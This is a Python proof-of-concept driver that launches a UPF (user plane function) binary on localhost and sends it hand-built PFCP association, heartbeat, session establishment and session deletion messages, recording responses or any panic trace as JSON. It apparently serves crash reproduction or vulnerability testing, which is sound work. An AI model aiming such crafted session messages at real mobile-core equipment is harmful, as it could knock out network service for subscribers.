#!/usr/bin/env python3
"""
PoC driver for the UPF network service binary.

Starts the target, probes it with PFCP messages over UDP on 127.0.0.1:8805,
and reports the observed outcome as a structured JSON result.
"""

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time


def build_pfcp_header(msg_type: int, body_len: int, seq: int) -> bytes:
    """Build a PFCPv1 header (no SEID flag)."""
    # Byte 0: version=1 (001), spare, MP=0, S=0, T=0, spare -> 0x20
    # Byte 1: message type
    # Bytes 2-3: length (total - 4)
    # Bytes 4-6: sequence number
    # Byte 7: spare
    length = 4 + body_len  # seq(3) + spare(1) + body
    return (
        struct.pack("!BBH", 0x20, msg_type, length)
        + struct.pack(">I", seq)[:3]
        + b"\x00"
    )


def build_ie(type_: int, value: bytes) -> bytes:
    """Build a PFCP Information Element: type(2), length(2), value."""
    return struct.pack("!HH", type_, len(value)) + value


def build_association_setup_request(seq: int) -> bytes:
    """Build a PFCP Association Setup Request (type 1)."""
    # Node ID IE (type 0x003C): IPv4 node (flags=0x00) + 4-byte IP
    node_id = build_ie(0x003C, b"\x00" + socket.inet_aton("127.0.0.1"))
    # Recovery Time Stamp IE (type 0x0060): 4-byte timestamp
    recovery = build_ie(0x0060, struct.pack("!I", int(time.time())))
    body = node_id + recovery
    return build_pfcp_header(1, len(body), seq) + body


def build_heartbeat_request(seq: int) -> bytes:
    """Build a PFCP Heartbeat Request (type 5).  No IEs needed."""
    return build_pfcp_header(5, 0, seq)


def build_session_establishment_request(seq: int) -> bytes:
    """Build a PFCP Session Establishment Request (type 50) with minimal IEs."""
    # Node ID IE
    node_id = build_ie(0x003C, b"\x00" + socket.inet_aton("127.0.0.1"))
    # F-SEID IE (type 0x003A): v4=0, v6=0, 8-byte SEID, 4-byte IP
    # Flags byte: bit 0 = v4 (1 means IPv4 present)
    fseid = build_ie(0x003A, struct.pack("!BQ", 0x01, 0xDEADBEEFCAFEBABE) + socket.inet_aton("127.0.0.1"))
    body = node_id + fseid
    return build_pfcp_header(50, len(body), seq) + body


def build_session_deletion_request(seq: int) -> bytes:
    """Build a PFCP Session Deletion Request (type 52) with F-SEID IE."""
    # F-SEID IE
    fseid = build_ie(0x003A, struct.pack("!BQ", 0x01, 0xDEADBEEFCAFEBABE) + socket.inet_aton("127.0.0.1"))
    body = fseid
    return build_pfcp_header(52, len(body), seq) + body


def send_and_recv(sock: socket.socket, pkt: bytes, timeout: float = 3.0):
    """Send a UDP datagram and return (response, addr) or (None, None)."""
    sock.settimeout(timeout)
    try:
        sock.sendto(pkt, ("127.0.0.1", 8805))
        data, addr = sock.recvfrom(8192)
        return data, addr
    except socket.timeout:
        return None, None


def main():
    parser = argparse.ArgumentParser(
        description="PoC driver for UPF network service binary"
    )
    parser.add_argument("--binary", required=True, help="Path to the upf binary")
    parser.add_argument("--json-out", help="Path to write JSON output (default: stdout)")
    parser.add_argument("--timeout", type=int, default=15, help="Observation window in seconds")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    start_time = time.monotonic()

    # Default output
    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "no_response", "path": None},
        "error": None,
    }

    # Validate binary
    if not os.path.isfile(binary):
        result["error"] = f"binary not found: {binary}"
        result["runtime_ms"] = int((time.monotonic() - start_time) * 1000)
        _emit(result, args.json_out)
        return

    # Write temporary config file
    config = {
        "mode": "af_packet",
        "access": {"ifname": "lo"},
        "core": {"ifname": "lo"},
        "cpiface": {"hostname": "", "http_port": "0", "dnn": "internet"},
        "n4_addr": "127.0.0.1",
        "resp_timeout": "2s",
        "read_timeout": 15,
        "log_level": "info",
    }

    tmpdir = tempfile.mkdtemp(prefix="upf_poc_")
    config_path = os.path.join(tmpdir, "config.json")
    try:
        with open(config_path, "w") as f:
            json.dump(config, f)

        command = [binary, "-config", config_path]
        result["command"] = command

        # Start the target process
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        # Give it time to start listening
        time.sleep(2)

        # Check if it died immediately
        if proc.poll() is not None:
            result["returncode"] = proc.returncode
            result["stdout"] = (proc.stdout.read() or b"").decode("utf-8", errors="replace")
            result["stderr"] = (proc.stderr.read() or b"").decode("utf-8", errors="replace")
            result["runtime_ms"] = int((time.monotonic() - start_time) * 1000)
            result["error"] = f"target exited immediately with code {proc.returncode}"
            _emit(result, args.json_out)
            return

        # ---- Probing phase ----
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Probe 1: Association Setup Request (establishes PFCP association)
        assoc_req = build_association_setup_request(seq=1)
        resp1, _ = send_and_recv(sock, assoc_req)

        # Probe 2: Heartbeat Request (basic liveness)
        hb_req = build_heartbeat_request(seq=2)
        resp2, _ = send_and_recv(sock, hb_req)

        # Probe 3: Session Establishment Request (exercises session handling)
        sess_req = build_session_establishment_request(seq=3)
        resp3, _ = send_and_recv(sock, sess_req)

        # Probe 4: Session Deletion Request (exercises session lookup)
        del_req = build_session_deletion_request(seq=4)
        resp4, _ = send_and_recv(sock, del_req)

        # Collect protocol transcript
        transcript = {}
        if resp1:
            transcript["association_setup_response"] = resp1.hex()
        if resp2:
            transcript["heartbeat_response"] = resp2.hex()
        if resp3:
            transcript["session_establishment_response"] = resp3.hex()
        if resp4:
            transcript["session_deletion_response"] = resp4.hex()

        if transcript:
            # All responses combined into a single transcript value
            parts = []
            for label, hexval in sorted(transcript.items()):
                parts.append(f"{label}:{hexval}")
            result["observable"] = {
                "kind": "protocol_transcript",
                "value": "|".join(parts),
                "path": None,
            }
        else:
            result["observable"] = {
                "kind": "protocol_transcript",
                "value": "no_response",
                "path": None,
            }

        # Wait for the timeout window or until the process exits
        deadline = start_time + args.timeout
        remaining = deadline - time.monotonic()
        if remaining > 0:
            try:
                proc.wait(timeout=remaining)
            except subprocess.TimeoutExpired:
                pass

        # Collect output
        elapsed = time.monotonic() - start_time
        result["runtime_ms"] = int(elapsed * 1000)

        if proc.poll() is None:
            # Still running -> terminate
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            result["timed_out"] = True
            result["returncode"] = proc.returncode
            result["signal"] = None
            # Read output after termination
            result["stdout"] = (proc.stdout.read() or b"").decode("utf-8", errors="replace")
            result["stderr"] = (proc.stderr.read() or b"").decode("utf-8", errors="replace")
        else:
            result["returncode"] = proc.returncode
            # Check for signal-induced exit
            sig = None
            if proc.returncode < 0:
                sig_num = -proc.returncode
                import signal as signal_module
                try:
                    sig = signal_module.Signals(sig_num).name
                except ValueError:
                    sig = f"SIGUNKNOWN({sig_num})"
            result["signal"] = sig
            result["timed_out"] = False

            # If it crashed, extract the crash trace from stderr
            stderr_text = (proc.stderr.read() or b"").decode("utf-8", errors="replace")
            stdout_text = (proc.stdout.read() or b"").decode("utf-8", errors="replace")
            result["stdout"] = stdout_text
            result["stderr"] = stderr_text

            if sig is not None:
                # Extract panic/crash trace
                trace = ""
                if "panic:" in stderr_text:
                    trace = stderr_text
                elif "panic:" in stdout_text:
                    trace = stdout_text
                else:
                    trace = stderr_text or stdout_text
                result["observable"] = {
                    "kind": "crash_trace",
                    "value": trace,
                    "path": None,
                }
        sock.close()

    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        result["runtime_ms"] = int((time.monotonic() - start_time) * 1000)
    finally:
        # Clean up: ensure subprocess is dead
        if "proc" in locals() and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
        # Clean up temp directory
        try:
            import shutil
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass

    _emit(result, args.json_out)


def _emit(result: dict, json_out: str | None):
    """Write the JSON result to a file or stdout."""
    text = json.dumps(result, indent=2, ensure_ascii=False)
    if json_out:
        os.makedirs(os.path.dirname(os.path.abspath(json_out)) or ".", exist_ok=True)
        with open(json_out, "w") as f:
            f.write(text)
    else:
        print(text)


if __name__ == "__main__":
    main()